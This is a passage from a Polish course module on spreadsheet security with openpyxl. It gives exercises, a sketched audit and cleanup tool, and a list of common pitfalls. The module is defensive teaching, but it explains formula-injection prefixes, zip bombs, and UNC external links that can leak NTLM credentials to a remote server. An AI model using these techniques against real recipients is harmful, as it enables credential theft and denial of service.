4. **Dodaj `hypothesis`.** Napisz test właściwościowy: dla dowolnego tekstu z alfabetu `"=+-@\t\r abc0123456789"` — **jeśli `normalizuj(t, "text").jako_tekst` jest `False`, to tekst NIE zaczyna się od żadnego z `DANGEROUS_PREFIXES`**. To niezmiennik „obrona jest kompletna". Czy `hypothesis` znajdzie kontrprzykład? Spróbuj z alfabetem rozszerzonym o znak, którego nie ma na liście.
5. **Zastosuj `sanitize_cell_value` do CSV.** Napisz `do_csv_bezpiecznie(rows)` z apostrofem jako prefiksem i **dodaj** `DANGEROUS_PREFIXES` na wypadek, gdyby CSV był czytany przez program, który traktuje `@` jako formułę. Porównaj w 5 punktach, czym ten kod różni się od kodu dla `.xlsx`.

### 🔴 Wyzwanie

**Zadanie 3 — skrypt „audyt pliku przed wysyłką".**

Zbuduj pełne narzędzie z Przykładu 3 plus część **naprawczą**, i **zbierz je w CLI**.

**Wymagania — audyt (jak w 3.3, wszystkie punkty):**

1. Warstwa ZIP: wszystkie 7 kategorii z `NAZWY_CZESCI_SZCZEGOLNIE_WRAZLIWYCH`, plus **linki zewnętrzne czytane z `xl/externalLinks/_rels/*.rels`** (nie z `wb._external_links`!), plus **flagowanie UNC** (`\\`, `//`) i **ścieżek lokalnych z literą dysku** (`C:\`).
2. Warstwa modelu: arkusze `hidden` i `veryHidden`, ukryte wiersze **i kolumny z danymi**, wartości z `number_format == ";;;"`, komentarze z autorami, definiowane nazwy (`hidden`, `is_external`, `attr_text`), właściwości dokumentu, własne właściwości.
3. **Kategorie jako `Enum`**, nie stringi (żeby literówka była błędem, a nie nową kategorią).
4. Werdykt: `czy_bezpieczny()` + **rekomendacja** („wyślij" / „wygeneruj nowy plik z wartości" / „usuń wskazane elementy").
5. **Kod wyjścia CLI**: 0 = czysto, 1 = zastrzeżenia (żeby można było podpiąć pod CI — moduł 20!).

**Wymagania — naprawa:**

Napisz `zrob_kopie_do_udostepnienia(src, dst, zostaw_arkusze)` z sekcji 2.10. **Musi**:

- używać `data_only=True` **i** `keep_links=False` **razem** (wyjaśnij w komentarzu, dlaczego *razem*!),
- mieć **białą listę** `zostaw_arkusze` (nie czarną!),
- czyścić `;;;` **zmieniając wartość i format naraz**,
- czyścić metadane (łącznie z `lastModifiedBy`),
- zapisywać na dysk **atomowo** (`mkstemp` + `os.replace`, bez `mktemp`),
- mieć `finally: wb.close()`.

**Wymagania — testy (minimum 12):**

1. Fixture budujący **celowo brudny** skoroszyt: `veryHidden` arkusz z danymi, ukryta kolumna z danymi, komórka z `;;;` i wartością, komentarz z autorem, 2 definiowane nazwy (jedna ukryta), metadane z nazwiskiem, obraz (moduł 16).
2. Test, że audyt **wykrywa każdą** z tych rzeczy (`parametrize` po kategoriach).
3. Test, że audyt pliku **czystego** zwraca **zero** zastrzeżeń (to najważniejszy test — inaczej narzędzie straszy fałszywie).
4. Test, że kopia po naprawie audytuje się **czyściściej** niż oryginał.
5. Test, że `zostaw_arkusze` działa jako **biała lista** (czarny arkusz, którego nikt nie wskazał — znika).
6. Test, że pliki tymczasowe **nie zostają** po zakończeniu (sprawdź zawartość katalogu).
7. Test, że zapis jest atomowy (napisz coś do pliku docelowego, wymuś błąd, sprawdź że oryginał pliku docelowego jest nietknięty).
8. Test, że `;;;` **daje `General` i `None`** po naprawie.
9. Test, że metadane `creator`/`lastModifiedBy` są nadpisane.
10. Test, że `keep_links=False` **usuwa** `xl/externalLinks/` z pliku wynikowego (sprawdź w ZIP-ie!).
11. Test, że audyt **nie modyfikuje** pliku (porównaj hash przed i po — użyj `odcisk_bajtowy` z modułu 20!).
12. Test na plik **niebędący ZIP-em** — `BadZipFile`, nie wyciek surowego wyjątku.

W pliku `output/21_cw3_wnioski.md` odpowiedz:

1. **Stwórz plik z linkiem zewnętrznym do `\\SERWER\udzial$\plik.xlsx`.** Jak go zrobiłeś? Dlaczego nie da się go zrobić samym openpyxl i co musiałeś zrobić (podpowiedź: `wb._external_links` — prywatne API!). Zapisz **oba** podejścia: przez prywatne API i przez ręczną manipulację ZIP-em. Które jest bardziej odporne na zmianę wersji openpyxl i **dlaczego**?
2. **Ile zastrzeżeń wykrył audyt w Twoim brudnym pliku?** Wypisz pełne wyjście. Ile z nich **nie byłoby widocznych** w Excelu dla odbiorcy?
3. **Przeprowadź eksperyment „naprawa vs. budowa od zera".** Zaudytuj (a) oryginał, (b) kopię po `zrob_kopie_do_udostepnienia`. Wypisz **oba** raporty obok siebie. Dlaczego kopia jest czystsza? Czego **nie** dało się naprawić i zarazem czego **nie trzeba** było naprawiać (podpowiedź: `data_only=True` sprawia, że część problemów znika „sama" — wyjaśnij, dlaczego).
4. **Sprawdź `DEFUSEDXML` i `LXML`.** Wypisz wartości. **Następnie ustaw `OPENPYXL_DEFUSEDXML=1`** i uruchom ponownie. Co pokaże `DEFUSEDXML`? Wyjaśnij, dlaczego `1` **wyłącza** ochronę (odwołaj się do porównania `== "True"` z 2.6.2). **Zapisz to jako komentarz w kodzie**, żeby nikt w Twoim zespole tego nie powtórzył.
5. **Zmierz czas audytu i naprawy** na pliku z 50 000 wierszy. Czy `read_only=True` dałoby się użyć w audycie? Które kontrole byś stracił (wypisz **trzy konkretne**) i czy byś je stracił świadomie?
6. **Podepnij audyt pod CI.** Dodaj krok w workflow z modułu 20, który uruchamia audyt na repozytoryjnym pliku wzorcowym z `tests/golden/` i **wymaga kodu wyjścia 0**. Co się stanie, gdy ktoś „na chwilę" doda `veryHidden` arkusz do wzorca? Zapisz komunikat.

<details>
<summary><strong>Szkic rozwiązania zadania 3 — kluczowe decyzje i fragmenty</strong></summary>

**Decyzja 1: `Enum` zamiast stringów.**

```python
from enum import Enum

class Kategoria(str, Enum):
    """Kategorie zastrzezen. Dziedziczenie po str daje czytelne wypisy."""
    ARKUSZ_UKRYTY = "arkusz ukryty"
    UKRYTY_WIERSZ = "ukryty wiersz"
    UKRYTA_KOLUMNA = "ukryta kolumna"
    WARTOSC_UKRYTA_FORMATEM = "wartosc ukryta formatem"
    KOMENTARZ = "komentarz"
    NAZWA_UKRYTA = "definiowana nazwa (ukryta)"
    NAZWA_ZEWNETRZNA = "definiowana nazwa (zewnetrzna)"
    LINK_ZEWNETRZNY = "link zewnętrzny"
    SCIEZKA_UNC = "sciezka UNC"
    WLASCIWOSC_DOKUMENTU = "wlasciwosc dokumentu"
    CZESC_ARCHIWUM = "czesc archiwum"
    FORMULA_MIEDZYARKUSZOWA = "formula miedzyarkuszowa"
    FORMULA_DO_LINKU = "formula do linku zewn."
```

**Dlaczego `Enum`, a nie `str`:** przy stringach literówka `"arkusz ukryty"` vs `"arkusz ukryte"` tworzy **nową kategorię** i psuje raportowanie (podsumowanie pokaże dwie linie zamiast jednej) — a nic tego nie złapie. Z `Enum` literówka to `AttributeError` **w momencie uruchomienia testu**. Dokładnie ta sama zasada, co `--strict-markers` w `pytest` (moduł 20): **literówka ma być błędem, nie cichym pominięciem.**

**Decyzja 2: linki zewnętrzne — czytamy ZIP, nie prywatne API.**

```python
def linki_zewnetrzne(sciezka) -> dict[int, str]:
    """Zwraca {numer_linku: cel} czytajac STANDARD OOXML, nie prywatne API.

    Dlaczego nie wb._external_links (sekcja 2.8f):
      - atrybut jest PRYWATNY (podkreslenie) - moze zniknac w kazdej wersji,
      - nie mowi nic o czesciach, ktorych openpyxl nie modeluje,
      - wymaga wczytania CALEGO modelu, zeby odczytac kilka sciezek.
    Format ZIP+XML jest STANDARDEM - zostanie taki sam.
    """
    wynik: dict[int, str] = {}
    wzorzec = re.compile(r"xl/externalLinks/_rels/externalLink(\d+)\.xml\.rels$")
    with zipfile.ZipFile(sciezka) as zf:
        for nazwa in zf.namelist():
            m = wzorzec.match(nazwa)
            if not m:
                continue
            xml = zf.read(nazwa).decode("utf-8", errors="replace")
            target = re.search(r'Target="([^"]+)"', xml)
            if target:
                cel = target.group(1).replace("%20", " ").replace("file:///", "")
                wynik[int(m.group(1))] = cel
    return dict(sorted(wynik.items()))
```

**Decyzja 3: naprawa przez **odejmowanie od kopii bez formuł**, nie przez usuwanie elementów.**

```python
def zrob_kopie_do_udostepnienia(src, dst, zostaw_arkusze) -> None:
    # data_only=True I keep_links=False RAZEM - to nie jest ostroznosc:
    #   data_only=True  -> formuly staja sie wartosciami ZANIM znikna linki.
    #                      Bez tego mielibysmy formuly do '[1]...', ktore po
    #                      usunieciu definicji linku daja #REF! (sekcja 2.10).
    #   keep_links=False -> parser NIE wczytuje czesci externalLink.
    #                      Oszczedza pamiec (modul 19) i usuwa wyciek sieciowy.
    # Odwrotna kolejnosc (linki precz, formuly zostaja) = ZEPSUTY RAPORT.
    wb = load_workbook(src, data_only=True, keep_links=False)
    try:
        for ws in list(wb.worksheets):
            # BIALA LISTA: zostaw to, co wskazano i co jest widoczne.
            if ws.title not in zostaw_arkusze or ws.sheet_state != "visible":
                wb.remove(ws)

        for ws in wb.worksheets:
            for dim in ws.row_dimensions.values():
                dim.hidden = False
            for dim in ws.column_dimensions.values():
                dim.hidden = False

            for wiersz in ws.iter_rows():
                for c in wiersz:
                    c.comment = None
                    if c.number_format == ";;;":
                        # OBA pola naraz - inaczej wyciek zostaje, tylko go nie widac
                        c.value = None
                        c.number_format = "General"

        wb.properties.creator = "Automat raportowy"
        wb.properties.lastModifiedBy = "Automat raportowy"
        wb.properties.title = "Raport (kopia do udostepnienia)"
        wb.properties.subject = None
        wb.properties.keywords = None
        wb.properties.description = None

        # Zapis atomowy - bez mktemp()! (sekcja 2.11A)
        import os, tempfile
        from pathlib import Path
        dst = Path(dst)
        fd, tmp = tempfile.mkstemp(suffix=".xlsx", dir=dst.parent)
        os.close(fd)
        try:
            wb.save(tmp)
            os.replace(tmp, dst)
        except BaseException:      # takze KeyboardInterrupt/SystemExit
            Path(tmp).unlink(missing_ok=True)
            raise
    finally:
        wb.close()
```

**Decyzja 4: audyt **nie ma prawa** zapisu — i to nie w kodzie, a w uprawnieniach.**

W skrypcie CLI audyt uruchamiasz na pliku otwartym **tylko do odczytu**, a katalog wejściowy ma prawa bez zapisu dla procesu. Dlaczego? Bo test „audyt nie modyfikuje pliku" (test 11, hash przed/po) sprawdza **Twój kod**, a uprawnienia systemowe sprawdzają **wszystkie ścieżki** — także te, o których nie pomyślałeś (`load_workbook` może tworzyć pliki tymczasowe, biblioteki mogą zapisywać cache, przyszły współpracownik może dodać `save` i „nie zauważyć"). **Zasada: kontrolę, którą można przenieść z kodu do środowiska, przenoś do środowiska.** Kod zmienia się przy każdym commicie; uprawnienia nie.

**Decyzja 5: CLI z kodem wyjścia, żeby audyt dał się **wpiąć** w proces.**

```python
def main(argv=None) -> int:
    import argparse, sys
    parser = argparse.ArgumentParser(description="Audyt skoroszytu przed wyslaniem")
    parser.add_argument("plik")
    parser.add_argument("--napraw", metavar="WYJSCIE",
                        help="Zapisz oczyszczona kopie do tego pliku")
    parser.add_argument("--zostaw", nargs="+", default=None,
                        help="Arkusze do zostawienia w kopii (biala lista)")
    args = parser.parse_args(argv)

    raport = audyt(args.plik)
    print_raport(raport)

    if args.napraw:
        if not args.zostaw:
            print("BLAD: --napraw wymaga --zostaw (biala lista, nie czarna!).")
            return 2
        zrob_kopie_do_udostepnienia(args.plik, args.napraw, set(args.zostaw))
        print(f"Zapisano oczyszczona kopie: {args.napraw}")
        return 0

    return 0 if raport.czy_bezpieczny() else 1     # ⬅ kod wyjscia pod CI
```

**Dlaczego kod wyjścia to klucz do użyteczności:** narzędzie, które trzeba **przeczytać okiem**, jest używane raz na miesiąc. Narzędzie, które zwraca **kod wyjścia**, wpina się w CI (moduł 20) i **działa przy każdym commicie**. To jest ta sama lekcja co z `--cov-fail-under=80` i `assert LXML`: **zabezpieczenie musi być automatyczne, bo ręczne zawsze przegrywa z brakiem czasu.** `--zostaw` jest obowiązkowe przy `--napraw`, żeby **wymusić** białą listę — gdyby było opcjonalne, ktoś użyłby domyślnej (czarnej) i wysłał plik z arkuszem, którego nie chciał.

**Czego tu świadomie NIE ma:**

- **Nie usuwamy obrazów z `xl/media/`.** Bo (a) część z nich jest **zamierzona** (logo firmy), (b) usunięcie wskazanej części ZIP-a **nie jest wspierane przez openpyxl** — trzeba by przepakować archiwum ręcznie, co jest ryzykowne. Zamiast tego audyt **flaguje** obrazy i decyzję podejmuje człowiek. To jest zgodne z całą filozofią kursu (moduł 18): **openpyxl częściowo obsługuje, więc mów wprost, że to „częściowo", zamiast udawać, że obsługuje.**
- **Nie próbujemy „ocenzurować" formuł w pliku wejściowym.** Wariant „naprawy" idzie przez `data_only=True`, czyli **nie przenosi formuł w ogóle**. Próba „przepisania formuły z neutralizacją" byłaby nieskończoną grą w kotka i myszkę: trzeba by znać wszystkie funkcje groźne, wszystkie sposoby zapisu, wszystkie warianty. **Zamiast tego odbieramy im prawo bytu.**
- **Nie uznajemy pliku za bezpieczny na podstawie rozszerzenia ani pojedynczego sprawdzenia.** Audyt jest **wielowarstwowy** (ZIP + model + właściwości) i kończy się **ludzkim werdyktem** z **rekomendacją**, nie z „OK/NIE OK".

</details>

## 6. Typowe błędy i pułapki

**1. „`cell.font.bold = True`-owa logika: ustawiam `data_type = "s"`, potem przypisuję wartość… i znowu jest formuła" (objaw) → **przypisanie wartości nad pisuje `data_type`,** bo openpyxl wybiera typ **wewnątrz** `_bind_value`, czyli w momencie przypisania (sekcja 2.2, szczegół A). Dokładnie ten sam wzorzec, co niemutowalne style z modułu 09 (przypisanie po modyfikacji nadpisuje zmianę) (przyczyna) → **Zawsze: wartość najpierw, `data_type = "s"` potem.** Zapisz to jako komentarz w funkcji zapisującej, żeby refaktoryzacja nie odwróciła kolejności — i pokryj testem (przykład 2, test 9) (naprawa).**

**2. „`openpyxl.utils.escape` brzmi jak narzędzie bezpieczeństwa, więc go używam" (objaw) → **nazwa jest myląca.** Docstring mówi wprost: **„OOXML has non-standard escaping for characters < \031".** Ta funkcja zamienia znaki sterujące ASCII (1–31) na `_xHHHH_`. Nasz payload `=1+1` składa się ze znaków 61, 49, 43 — **powyżej 31**, więc regex `[\001-\031]` **nie dopasuje ani jednego znaku** i funkcja zwróci payload niezmieniony (sekcja 2.3) (przyczyna) → **Nie używaj jej do formuł — nie ma tam żadnego mechanizmu „escape-all".** Do `.xlsx` masz `data_type = "s"`, do CSV apostrof, a do pól o znanym kształcie — walidację whitelistową i konwersję do typu (naprawa).**

**3. „Filtruję tylko `=`, bo openpyxl tylko na to reaguje" (objaw) → **to prawda o openpyxl, ale nieprawda o odbiorcy.** Twoje dane trafiają do pliku, który otwiera **Excela albo LibreOffice**, a **dodatkowo** mogą być eksportowane skądś dalej — do CSV, do innego systemu. OWASP wymienia `=`, `+`, `-`, `@`, tab, CR (sekcja 2.1.3) (przyczyna) → **Sprawdzaj wszystkie prefiksy z listy — na surowej wartości, bez `strip()`.** Test 10 z przykładu 2 jest po to, żeby „uproszczenie" do samego `=` zostało złapane (naprawa).**

**4. „Escapuję tylko w CSV, bo tak się robi" (objaw) → **dla `.xlsx` apostrof jest niewłaściwym narzędziem.** W OOXML apostrof jest **zwykłym znakiem w wartości** — openpyxl go nie zdejmie, a Excel najprawdopodobniej pokaże go w komórce (prefiks tekstowy działa przy *wpisywaniu*, nie przy *wyświetlaniu*). Zabezpieczasz **niewłaściwą drogę**, a właściwa (`data_type = "s"`) leży odłogiem (sekcja 2.2, droga 2) (przyczyna) → **`.xlsx` → `data_type = "s"`; `.csv` → apostrof.** Wybierz `.xlsx`, gdy masz wybór, bo ma typy komórek (sekcja 2.5) (naprawa).**

**5. „Używam `sanitize` globalnie i nagle w raporcie kwoty są tekstem" (objaw) → **`-` jest na liście `DANGEROUS_PREFIXES`, ale **liczby ujemne też zaczynają się od `-`.** Krojenie prefiksem niszczy dane liczbowe (sekcja 2.2, droga 2) (przyczyna) → **Sanitacja jest kontekstowa: `tryb="number"` konwertuje do liczby i żaden prefiks nie ma szans; tryb `text` neutralizuje.** Test 5 (liczba ujemna) i test 6 z modułu 20 (brak `None` w kolumnie kwot) działają **razem** jako siatka (naprawa).**

**6. „Dane od klienta są bezpieczne, bo plik przyszedł od klienta" (objaw) → **lokalizacja pliku to nie jego treść.** Plik przyszedł mailem od firmy z logo? Świetnie — a kto napisał jego zawartość? (sekcja 1.3, antywzorzec 1) (przyczyna) → **Traktuj dane wejściowe jako dane nieufne bez wyjątków.** Nie ma znaczenia, kto dostarczył plik — znaczenie ma, **co jest w komórkach**. Uruchom audyt (przykład 3), zamiast zgadywać (naprawa).**

**7. „`load_workbook(BytesIO(upload))` — przecież openpyxl sprawdza format" (objaw) → **`_validate_archive` sprawdza rozszerzenie tylko wtedy, gdy argumentem jest ścieżka (string).** Przy `file-like object` (np. `BytesIO` z uploadu) gałąź `if not is_file_like` **nie wykonuje się** — **żadna walidacja nie zachodzi** (sekcja 2.6.3) (przyczyna) → **Waliduj sam:** rozszerzenie, `zipfile.is_zipfile`, obecność `[Content_Types].xml`, limity rozpakowania (przykład 4) (naprawa).**

**8. „`load_workbook` wyciekł surowy wyjątek do użytkownika razem ze ścieżką `/tmp/nasz-serwis-abc123/`" (objaw) → **wyjątki parsowania zawierają ścieżki katalogu tymczasowego, nazwy klas, fragmenty XML-a.** Przekazanie ich do klienta to **information disclosure** — daje atakującemu mapę Twojej infrastruktury (sekcja 2.11C) (przyczyna) → **Łap `(InvalidFileException, BadZipFile, KeyError)` i zwracaj ogólny komunikat.** Pełny wyjątek — do logów **dla Ciebie**, z kodem korelacji dla klienta (naprawa).**

**9. „Serwis padł 20 sekund po przyjęciu uploadu; log mówi `MemoryError`" (objaw) → **zip bomb.** Python `zipfile` **nie ma wykrywania zip bomb** (CVE-2019-9674), a openpyxl używa stdlib. 42 KB pliku → petabajty rozpakowanych danych (sekcja 2.6.1) (przyczyna) → **`sprawdz_archiwum()` przed `load_workbook`:** suma `file_size`, współczynnik `file_size/compress_size`, liczba wpisów. Plus **twardy limit pamięci procesu** jako siatka bezpieczeństwa (naprawa).**

**10. „Ustawiłem `OPENPYXL_DEFUSEDXML=1` i mam spokój" (objaw) → **kod porównuje `os.environ.get(...) == "True"`, więc każda wartość inna niż dokładnie `"True"` — w tym `"1"`, `"true"`, `"yes"` — WYŁĄCZA ochronę.** Ustawiłeś flagę „włączone" i **wyłączyłeś** zabezpieczenie (sekcja 2.6.2) (przyczyna) → **Nie ustawiaj tej zmiennej wcale** (domyślnie `"True"`). A jeśli musisz — **zweryfikuj `openpyxl.DEFUSEDXML is True` w kodzie przy starcie** (fail-fast). Ten sam problem dotyczy `OPENPYXL_LXML` (naprawa).**

**11. „Sanitizuję dane na wyjściu, więc walidacja na wejściu jest zbędna" (objaw) → **jest odwrotnie.** Walidacja na wejściu **eliminuje klasę problemów u źródła** (pole „NIP" staje się `str` z cyfr, „kwota" staje się `float`), a neutralizacja na wyjściu **tylko łata objaw**. Do tego droga od wejścia do wyjścia może zostać **ominięta** (inny endpoint, skrypt, ręczna poprawka) — a jeśli jedyna kontrola jest na wyjściu, ominięcie jej pozostawia dziurę (sekcja 2.2, droga 3) (przyczyna) → **Oba końce.** Biała lista **na wejściu** (domena nie przyjmuje byle czego), typowanie **przy zapisie** (obrona w głąb), weryfikacja **na wyjściu** (test, że działa) (naprawa).**

**12. „Eksportuję dane użytkownika do CSV i jestem bezpieczny, bo mam apostrof" (objaw) → **apostrof to konwencja czytnika, nie gwarancja formatu.** Różne programy mogą zachować apostrof **w widocznej treści**, a część może zignorować konwencję (sekcja 2.2, droga 2) (przyczyna) → **Traktuj apostrof jako mitygację, nie gwarancję.** Najlepsze rozwiązanie: **nie produkuj CSV, jeśli odbiorca może dostać `.xlsx`** — w XLSX masz mechanizm typu (`data_type="s"`), a w CSV tylko konwencję (sekcja 2.5) (naprawa).**

**13. „Używam `wb._external_links` w kodzie produkcyjnym, bo to jedyny sposób, żeby je zobaczyć" (objaw) → **atrybut jest PRYWATNY** (podkreślenie). Może zniknąć albo zmienić nazwę w każdej wersji openpyxl. Jest też wymieniany w przykładach w sieci jako „sposób", co utrwala ten błąd (sekcja 2.8f) (przyczyna) → **Czytaj `xl/externalLinks/_rels/*.rels` z ZIP-a — to STANDARD OOXML, więc jest stabilny.** Format ZIP+XML nie zniknie, bo **jest** *de facto* formatem pliku. Użyj `_external_links` co najwyżej w jednorazowym skrypcie diagnostycznym (naprawa).**

**14. „Firma wysłała raport klientowi i klient zgłosił, że plik 'próbuje się łączyć z naszym serwerem'" (objaw) → **link zewnętrzny ze ścieżką UNC** (`\\FILESERVER01\Finanse$\...`) w pliku. Excel przy otwarciu może próbować sięgnąć do zasobu, co prowadzi do **uwierzytelniania NTLM do zdalnego zasobu** — i ujawnia poświadczenia/hash z maszyny klienta. Plus wyciek: nazwy serwerów, ukrytych udziałów (`$`), struktury katalogów (sekcja 2.8f) (przyczyna) → **`keep_links=False` przy wczytaniu + audyt ZIP-a + budowa nowego pliku.** Sprawdź **przed** wysyłką, nie po (naprawa).**

**15. „Odkryłem wszystkie ukryte arkusze w Excelu i jestem czysty" (objaw) → **arkusz `veryHidden` nie pojawia się w oknie „Odkryj" Excela.** Ta opcja w ogóle go nie wyświetla — odkryć go można **tylko kodem** (albo w edytorze VBA). Ludzie trzymają tam dane wrażliwe właśnie **dlatego**, że są „nie do znalezienia" (sekcja 2.8a) (przyczyna) → **Sprawdzaj `ws.sheet_state` w kodzie.** I pamiętaj: jeśli Ty odkryłeś arkusz przez interfejs, to znaczy, że był `hidden`, a nie `veryHidden` (naprawa).**

**16. „Arkusz z kluczami API zniknął z raportu — ale… wysłałem stary plik i wszystko było w nim" (objaw) → **`copy_worksheet` nie kopiuje obrazków i wykresów** (moduł 08/16), ale w kontekście bezpieczeństwa chodzi o **inną** rzecz: *usuwanie* elementów z modelu **nie usuwa ich z pliku, jeśli nie zostały zapisane** — a `load_workbook` **wczytuje** to, co rozumie. Części, których openpyxl nie modeluje (shapes, sparkline'y), są **po cichu gubione przy zapisie** — więc jeśli zapisujesz plik od nowa, część problemu **rozwiązuje się sama**, ale Ty nie wiesz, która (sekcja 2.8k) (przyczyna) → **Audytuj ZIP, nie tylko model.** `namelist()` pokaże Ci części, których model nie zna. Nie zakładaj, że „coś zniknęło, bo nie ma w `wb`" (naprawa).**

**17. „Dodałem komentarz z nazwiskiem klienta do pliku wewnętrznego, żeby sprawdzić coś z kolegą" (objaw) → **komentarz ma `author`** i **jedzie razem z plikiem**. W korporacji autor to nazwisko + dział. Razem z treścią notatki tworzy materiał wywiadowczy (sekcja 2.8d) (przyczyna) → **Audyt wykrywa komentarze i autorów; czyszczenie: `cell.comment = None`.** Uwaga: komentarz w **scalonej komórce jest usuwany** (openpyxl ostrzega) — a więc jego obecność w pliku to albo ślad, albo już utracony (naprawa).**

**18. „Klient pisze, że kwota jest pusta, ale w pliku jest 0,00" (objaw) → **wartość ukryta formatem `;;;`** — komórka ma wartość, ale format pokazuje pustkę we wszystkich trzech sekcjach (dodatnie/ujemne/zero). Excel nie pokaże nic. To klasyka w plikach, gdzie ktoś „ukrył" kolumnę wewnętrzną (sekcja 2.8c) (przyczyna) → **Audyt: `number_format == ";;;"` i `value is not None`.** Naprawa: **zmień wartość I format** (`None` + `"General"`) — samo odsłonięcie formatu zostawia wyciek widoczny, a samo wyczyszczenie wartości zostawia komórki „sformatowane dziwnie" (naprawa).**

**19. „Zbudowałem tabelę przestawną, potem usunąłem arkusz źródłowy, a dane i tak wyciekły" (objaw) → **`xl/pivotCache/` zawiera pamięć podręczną tabeli przestawnej z kopią danych źródłowych.** Usunięcie arkusza **nie usuwa cache** (sekcja 2.8i) (przyczyna) → **Audyt: część `xl/pivotCache/` w archiwum.** Dla kopii udostępnianej: usuń tabele przestawne albo **buduj kopię od zera z wartości** — wtedy cache nie powstaje, bo nie ma z czego (naprawa).**

**20. „Nazwałem definiowaną nazwę `Marza_Zakupu_2026` i klient zapytał, gdzie jest arkusz 'Zakupy'" (objaw) → **definiowana nazwa jest CZYTELNA dla odbiorcy** (w menedżerze nazw), a jeśli jest `hidden` — tym gorzej, bo **nikt w interfejsie jej nie sprawdzi**, więc tym pewniej zostaje. Sama nazwa i `attr_text` to **wyciek strukturalny** (sekcja 2.8e) (przyczyna) → **`definicja.hidden`, `definicja.is_external`, `definicja.attr_text` w audycie.** Kopia do udostępnienia: usuń nazwy albo **buduj od zera** (naprawa).**

**21. „`tempfile.mktemp()` — nie, spokojnie, działa" (objaw) → **`mktemp()` jest udokumentowane jako NIEBEZPIECZNE.** Zwraca **tylko nazwę**, nie tworzy pliku — między wymyśleniem nazwy a jej użyciem atakujący może **podstawić dowiązanie symboliczne** (TOCTOU). Jeśli Twój proces ma wyższe uprawnienia niż atakujący, możesz zapisać **jego** treść **jego** ścieżką — albo **nadpisać plik systemowy** (sekcja 2.11A, sekcja 2.11 punkt „B” odnośnie literałów) (przyczyna) → **`mkstemp()` — tworzy plik atomowo i zwraca `(deskryptor, ścieżka)`.** Zamknij deskryptor i pracuj na ścieżce (przykład 4) (naprawa).**

**22. „`subprocess.run(timeout=10)` — ale to nie pomogło, proces żyje i zjada RAM" (objaw) → **`timeout` w `subprocess.run` działa, ale:** (a) nie możesz go użyć, jeśli przetwarzasz w **tym samym** procesie (a to najczęstszy błąd — „dam timeout na poziomie klienta HTTP" — **klient HTTP nie zatrzyma procesu serwera!**), (b) `signal.alarm` (jedyne wyjście w procesie) **nie działa na Windows** (sekcja 2.11B) (przyczyna) → **Przetwarzaj pliki od użytkowników w OSOBNYM procesie** (`subprocess.run(..., timeout=N)`, `ProcessPoolExecutor` z timeoutem) i na tym procesie nałóż **twardy limit pamięci** (cgroup / `resource.setrlimit`). Sam limit czasu **nie ogranicza pamięci** (naprawa).**

**23. „Loguję pełną treść komórek do debugowania i… dane osobowe wyciekły, a do logu wpadły fałszywe linie" (objaw) → **dwa problemy naraz:** (1) **PII** w systemie logów, który zwykle ma **słabszą** kontrolę dostępu niż baza, (2) **log injection** — wartość komórki z `\n` **wstrzykuje fałszywe linie** do logu (np. `2026-10-08 INFO Logowanie OK` jako „dane"), co potrafi zmylić SIEM (sekcja 2.11C) (przyczyna) → **Loguj METADANE, nie treść:** liczba wierszy/arkuszy, rozmiar, czas, **kategorie i liczba zastrzeżeń** z audytu (bez wartości). Jeśli musisz logować fragment — `repr()` (escapuje nowe linie i znaki sterujące) plus limit długości (naprawa).**

**24. „Nazwa pliku od użytkownika wpadła do ścieżki i zapisaliśmy plik poza katalogiem" (objaw) → **path traversal w Twoim własnym kodzie.** Nazwa może zawierać `..`, `/`, `\`, `~`, znaki NUL. `katalog / nazwa_od_uzytkownika` nie jest bezpieczne — **to nie jest walidacja** (sekcja 2.11C) (przyczyna) → **W ogóle nie używaj nazwy od użytkownika w ścieżce.** Nadaj własną (UUID), a oryginalną trzymaj **wyłącznie jako pole danych** (i nawet tam — oczyszczoną, bo trafi do logów/UI). Jeśli musisz — waliduj: `Path(nazwa).name == nazwa`, długość, znaki (naprawa).**

**25. „Zapisuję plik bezpośrednio do docelowej ścieżki i przerwanie w połowie zostawiło raport wyglądający na gotowy" (objaw) → **brak zapisu atomowego.** Przerwanie procesu (timeout! OOM! Ctrl+C!) w trakcie `wb.save()` zostawia plik **częściowo zapisany, ale poprawnie nazwany (`.xlsx`)** — czyli wygląda jak gotowy raport, a nie jest. To najgorszy możliwy artefakt: **użytkownik dostanie go i pomyśli, że dane są kompletne** (sekcja 2.11E) (przyczyna) → **`tmp` w tym samym katalogu → `save(tmp)` → `os.replace(tmp, cel)`.** Atomowo na tym samym wolumenie. Plus `except BaseException: unlink(tmp)` (naprawa).**

**26. „Napisałem w kodzie komentarz: 'to usuwa wszystkie formuły', ale raport ma `#REF!`" (objaw) → **pomyliłeś kolejność: usunięcie definicji linku przed zamianą formuł na wartości** (albo `keep_links=False` bez `data_only=True`) zostawia formuły odwołujące się do nieistniejącego `[1]` → `#REF!` (sekcja 2.10, szczegół 1) (przyczyna) → **`data_only=True` I `keep_links=False` RAZEM.** Formuła staje się wartością **zanim** link zniknie. Zapisz to jako komentarz — inaczej ktoś „uporządkuje" flagi i zepsuje raport (naprawa).**

**27. „Uznałem plik za bezpieczny, bo rozszerzenie to `.xlsx`" (objaw) → **rozszerzenie to nazwa nadana przez atakującego, a nie dowód treści.** openpyxl sprawdza wyłącznie rozszerzenie (i tylko dla ścieżek!), więc `.xlsx` na zip bombie **przechodzi** (sekcja 2.6.3) (przyczyna) → **Waliduj TREŚĆ: `zipfile.is_zipfile`, obecność `[Content_Types].xml`, limity rozmiarów, sprawdzenie części.** I sprawdzaj rozszerzenie **sam** — bo openpyxl tego nie robi dla buforów (naprawa).**

**28. „Nie używam `read_only`, bo potrzebuję stylów" (objaw) → **uzasadnienie jest prawdziwe**, ale nieuświadomione są konsekwencje: tryb normalny **buduje kompletny model** (~50× rozpakowany rozmiar — moduł 19) i **ma więcej powierzchni** (więcej parsowania, więcej części). Rozróżnij: (a) **odczyt danych** → `read_only=True` (szybciej, mniej pamięci), (b) **audyt wyglądu** → tryb normalny, ale na **pliku wyjściowym**, nie wejściowym (sekcja 3.3) (przyczyna) → **Audytuj plik, który wysyłasz (mały).** Na pliku wejściowym 500 000 wierszy audyt nie jest konieczny — bo i tak budujesz nowy plik z wartości (naprawa).**

## 7. Podsumowanie — model mentalny w 5 punktach

1. **Dwa drzwi, jedno w opiece.** Twoje drzwi (Python) są zamknięte: `"=1+1"` w pamięci to napis i nic się nie dzieje. **Drugie drzwi to Excel odbiorcy** — i tam napis staje się kodem. Twoja praca nie polega na tym, żeby „nic nie uruchomić" (to i tak niemożliwe, bo nie Ty uruchamiasz), a na tym, żeby **ładunek nie znalazł się w pliku**. Zapis do pliku to nie wykonanie — to **przygotowanie egzekucji na cudzej maszynie**.

